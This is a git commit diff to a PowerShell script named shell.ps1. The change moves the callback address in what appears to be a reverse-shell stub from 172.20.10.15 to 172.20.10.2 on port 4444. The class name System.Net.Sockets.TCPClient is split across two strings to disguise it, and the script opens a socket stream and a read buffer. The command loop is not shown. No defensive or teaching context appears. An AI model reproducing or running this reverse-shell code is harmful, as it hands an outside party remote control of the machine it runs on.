4abe736ea7e4aeb065ef9a0184ad8931ff304c74
B15cu1t <141248562+B15cu1t@users.noreply.github.com>
2026-03-16 15:49:27 +0100

    Update shell.ps1

--- shell.ps1
+++ shell.ps1
@@ -1,6 +1,6 @@
 $a = "System.Net.Sockets."
 $b = "TCPClient"
-$c = New-Object ($a + $b)("172.20.10.15", 4444) # Change IP if needed
+$c = New-Object ($a + $b)("172.20.10.2", 4444) # Change IP if needed
 $s = $c.GetStream()
 
 [byte[]]$b_arr = 0..65535|%{0}
